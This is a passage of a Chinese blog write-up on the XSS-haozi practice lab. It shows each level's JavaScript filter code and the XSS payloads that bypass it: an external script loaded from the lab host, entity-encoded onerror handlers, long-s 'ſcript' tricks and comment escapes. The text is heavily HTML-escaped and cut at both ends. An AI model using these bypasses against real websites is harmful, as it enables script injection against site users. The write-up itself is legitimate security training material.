class="toc-text">URL编码范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS%E7%BC%96%E7%A0%81%E8%8C%83%E5%9B%B4"><span class="toc-number">1.5.2.</span> <span class="toc-text">JS编码范围</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E9%9D%B6%E5%9C%BA%E6%A8%A1%E6%8B%9F"><span class="toc-number">2.</span> <span class="toc-text">编码靶场模拟</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81-1"><span class="toc-number">2.1.</span> <span class="toc-text">HTML实体编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Javascript%E7%BC%96%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">Javascript编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B7%E5%90%88%E7%BC%96%E7%A0%81"><span class="toc-number">2.3.</span> <span class="toc-text">混合编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%A0%E7%A7%8D%E5%9C%BA%E6%99%AF%E5%88%86%E6%9E%90"><span class="toc-number">2.4.</span> <span class="toc-text">几种场景分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80-GET"><span class="toc-number">2.4.1.</span> <span class="toc-text">场景一 GET</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C-%E5%BC%B9%E7%AA%97%E9%97%AE%E9%A2%98"><span class="toc-number">2.4.2.</span> <span class="toc-text">场景二 弹窗问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%96%91%E9%9A%BE%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">常见疑难点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E5%8C%96%E7%BC%96%E7%A0%81%E5%90%8E%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E9%98%B2%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-number">3.1.</span> <span class="toc-text">实体化编码后为什么可以防注入？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E6%97%B6%E5%80%99%E5%8F%88%E8%A6%81%E9%80%9A%E8%BF%87%E5%AE%9E%E4%BD%93%E5%8C%96%E7%BC%96%E7%A0%81%E5%8E%BB%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%EF%BC%9F"><span class="toc-number">3.2.</span> <span class="toc-text">为什么有时候又要通过实体化编码去绕过检测？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">4.</span> <span class="toc-text">常用语句</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-haozi-%E9%9D%B6%E5%9C%BA"><span class="toc-number">5.</span> <span class="toc-text">XSS-haozi-靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-number">5.1.</span> <span class="toc-text">0x00 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01"><span class="toc-number">5.2.</span> <span class="toc-text">0X01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code"><span class="toc-number">5.2.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-%E9%80%83%E9%80%B8"><span class="toc-number">5.2.2.</span> <span class="toc-text">Payload 逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00%E5%92%8C0x01%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90"><span class="toc-number">5.2.3.</span> <span class="toc-text">0x00和0x01对比分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E9%97%AD%E5%90%88%E3%80%81onmouseover"><span class="toc-number">5.3.</span> <span class="toc-text">0x02 闭合、onmouseover</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-1"><span class="toc-number">5.3.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">5.3.2.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E8%BF%87%E6%BB%A4"><span class="toc-number">5.4.</span> <span class="toc-text">0x03 过滤()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-2"><span class="toc-number">5.4.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-1"><span class="toc-number">5.4.2.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E8%BF%87%E6%BB%A4"><span class="toc-number">5.5.</span> <span class="toc-text">0x04 过滤( )&#96;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-3"><span class="toc-number">5.5.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-2"><span class="toc-number">5.5.2.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">5.6.</span> <span class="toc-text">0x05 注释符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-4"><span class="toc-number">5.6.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-3"><span class="toc-number">5.6.2.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E8%BF%87%E6%BB%A4on"><span class="toc-number">5.7.</span> <span class="toc-text">0x06 过滤on****&#x3D;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-5"><span class="toc-number">5.7.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-4"><span class="toc-number">5.7.2.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E8%BF%87%E6%BB%A4%E6%89%80%E6%9C%89-HTML%E6%A0%87%E7%AD%BE"><span class="toc-number">5.8.</span> <span class="toc-text">0x07 过滤所有 HTML标签</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-6"><span class="toc-number">5.8.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-5"><span class="toc-number">5.8.2.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E8%BF%87%E6%BB%A4%E6%8C%87%E5%AE%9A%E6%A0%87%E7%AD%BE"><span class="toc-number">5.9.</span> <span class="toc-text">0x08 过滤指定标签</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-7"><span class="toc-number">5.9.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-6"><span class="toc-number">5.9.2.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-HTTPS%E9%97%AD%E5%90%88"><span class="toc-number">5.10.</span> <span class="toc-text">0x09 HTTPS闭合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-8"><span class="toc-number">5.10.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-7"><span class="toc-number">5.10.2.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-HTTPS%E9%97%AD%E5%90%88-HTML%E5%AE%9E%E4%BD%93"><span class="toc-number">5.11.</span> <span class="toc-text">0x0A HTTPS闭合+HTML实体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-9"><span class="toc-number">5.11.1.</span> <span class="toc-text">Server Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-8"><span class="toc-number">5.11.2.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-%E8%BD%AC%E6%8D%A2%E5%A4%A7%E5%86%99"><span class="toc-number">5.12.</span> <span class="toc-text">0x0B  转换大写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Code-10"><span class="toc-number">5.12.1.</span> <span class="toc-text">Server Code</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">标签

HTML不区分大小写 2. Javascript严格区分大小写

方法一：在&lt;font style&#x3D;&quot;background-color:rgb(248, 248, 248);&quot;&gt;&lt;script&gt;&lt;&#x2F;font&gt;标签中的src添加，payload：&lt;font style&#x3D;&quot;background-color:rgb(248, 248, 248);&quot;&gt;&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;xss.haozi.me&#x2F;j.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;font&gt;

这种方式是通过 src 属性引用外部的 JavaScript 文件。恶意代码存放在远程服务器上，当页面加载时会从指定的 URL 下载并执行该文件中的代码。这样做的好处是可以在不修改页面代码的情况下，随时更新恶意代码，并且可以在多个页面中复用同一个恶意脚本文件。
方法二：将js的代码通过html实体编码绕过&lt;font style&#x3D;&quot;background-color:rgb(248, 248, 248);&quot;&gt;&lt;img src&#x3D;# onerror&#x3D;alert(1)&gt;&lt;&#x2F;font&gt; 即下面转码后的结果&lt;img src&#x3D;# onerror&#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;

Payload1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;xss.haozi.me&#x2F;j.js&quot;&gt;&lt;&#x2F;script&gt;



1&lt;img src&#x3D;# onerror&#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;



0x0C  转化大写+过滤scriptServer Code12345function render (input) {  input &#x3D; input.replace(&#x2F;script&#x2F;ig, &#39;&#39;)  input &#x3D; input.toUpperCase()  return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;&#x2F;h1&gt;&#39;}

过滤了，上一关的方法一无效了，但是方法二依然可以&lt;&#x2F;p&gt;
&lt;h3 id&#x3D;&quot;Payload-10&quot;&gt;&lt;a href&#x3D;&quot;#Payload-10&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Payload&quot;&gt;&lt;&#x2F;a&gt;Payload&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;#&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;onerror&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;h2 id&#x3D;&quot;0x0D-注释符-换行符绕过&quot;&gt;&lt;a href&#x3D;&quot;#0x0D-注释符-换行符绕过&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;0x0D  注释符+换行符绕过&quot;&gt;&lt;&#x2F;a&gt;0x0D  注释符+换行符绕过&lt;&#x2F;h2&gt;&lt;h3 id&#x3D;&quot;Server-Code-12&quot;&gt;&lt;a href&#x3D;&quot;#Server-Code-12&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Server Code&quot;&gt;&lt;&#x2F;a&gt;Server Code&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;function render (input) &amp;#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  input &#x3D; input.replace(&#x2F;[&lt;&#x2F;&quot;&amp;#x27;]&#x2F;g, &amp;#x27;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  return &#96;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;    &lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;          &lt;span class&#x3D;&quot;comment&quot;&gt;&#x2F;&#x2F; alert(&amp;#x27;$&amp;#123;input&amp;#125;&amp;#x27;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;    &lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  &#96;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&amp;#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;p&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;把其中的 &lt;&#x2F;font&gt;&lt;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;&lt;&#x2F;font&gt;&lt;&#x2F;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;、&lt;&#x2F;font&gt;&lt;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&quot;&lt;&#x2F;font&gt;&lt;&#x2F;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt; 和 &lt;&#x2F;font&gt;&lt;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&#39;&lt;&#x2F;font&gt;&lt;&#x2F;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt; 字符替换为空字符串，最后将处理后的字符串嵌入到 &lt;&#x2F;font&gt;&lt;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;script&gt;&lt;&#x2F;font&gt;&lt;&#x2F;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt; 标签里作为 &lt;&#x2F;font&gt;&lt;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;alert&lt;&#x2F;font&gt;&lt;&#x2F;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt; 函数的参数，并且返回包含 &lt;&#x2F;font&gt;&lt;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;script&gt;&lt;&#x2F;font&gt;&lt;&#x2F;code&gt;&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt; 标签的字符串。&lt;&#x2F;font&gt;&lt;&#x2F;p&gt;
&lt;h3 id&#x3D;&quot;Payload-11&quot;&gt;&lt;a href&#x3D;&quot;#Payload-11&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Payload&quot;&gt;&lt;&#x2F;a&gt;Payload&lt;&#x2F;h3&gt;&lt;p&gt;自己写了半天写了一个&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;alert(1)--&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;p&gt;首先用换行符绕过&lt;code&gt;&#x2F;&#x2F;&lt;&#x2F;code&gt;，然后用&lt;code&gt;--&gt;&lt;&#x2F;code&gt;注释符过滤后面的&lt;code&gt;&#39;)&lt;&#x2F;code&gt;。但是还是无法触发&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src&#x3D;&quot;&#x2F;.&#x2F;images&#x2F;20250621_1354384573.png&quot;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;不知道为啥注释符和alert(1)不能一起，不然无法触发&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;alert(1)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;--&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;h2 id&#x3D;&quot;0x0E-下划线干扰-大写转化&quot;&gt;&lt;a href&#x3D;&quot;#0x0E-下划线干扰-大写转化&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;0x0E 下划线干扰+大写转化&quot;&gt;&lt;&#x2F;a&gt;0x0E 下划线干扰+大写转化&lt;&#x2F;h2&gt;&lt;h3 id&#x3D;&quot;Server-Code-13&quot;&gt;&lt;a href&#x3D;&quot;#Server-Code-13&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Server Code&quot;&gt;&lt;&#x2F;a&gt;Server Code&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;function render (input) &amp;#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  input &#x3D; input.replace(&#x2F;&lt;([a-zA-Z])&#x2F;g, &amp;#x27;&lt;_$1&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  input &#x3D; input.toUpperCase()&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  return &amp;#x27;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&amp;#x27; + input + &amp;#x27;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&amp;#x27;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&amp;#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;p&gt;会转化大小写并且添加下划线干扰&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src&#x3D;&quot;&#x2F;.&#x2F;images&#x2F;20250621_1354382278.png&quot;&gt;&lt;&#x2F;p&gt;
&lt;h3 id&#x3D;&quot;Payload-12&quot;&gt;&lt;a href&#x3D;&quot;#Payload-12&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Payload&quot;&gt;&lt;&#x2F;a&gt;Payload&lt;&#x2F;h3&gt;&lt;p&gt;使用特殊符号&lt;code&gt;ſ&lt;&#x2F;code&gt;绕过，该符号是古英语的小写s&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;ſcript &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;https:&#x2F;&#x2F;xss.haozi.me&#x2F;j.js&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;ſvg&#x2F;onload&#x3D;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#x61;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#x6C;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#x65;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#x72;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#x74;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#x28;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#x31;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;#x29;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

&lt;h2 id&#x3D;&quot;0x0F-HTML实体转化&quot;&gt;&lt;a href&#x3D;&quot;#0x0F-HTML实体转化&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;0x0F HTML实体转化&quot;&gt;&lt;&#x2F;a&gt;0x0F HTML实体转化&lt;&#x2F;h2&gt;&lt;h3 id&#x3D;&quot;Server-Code-14&quot;&gt;&lt;a href&#x3D;&quot;#Server-Code-14&quot; class&#x3D;&quot;headerlink&quot; title&#x3D;&quot;Server Code&quot;&gt;&lt;&#x2F;a&gt;Server Code&lt;&#x2F;h3&gt;&lt;figure class&#x3D;&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;function render (input) &amp;#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;  function escapeHtml(s) &amp;#123;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;    return s.replace(&#x2F;&amp;&#x2F;g, &amp;#x27;&lt;span class&#x3D;&quot;symbol&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&amp;#x27;)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span 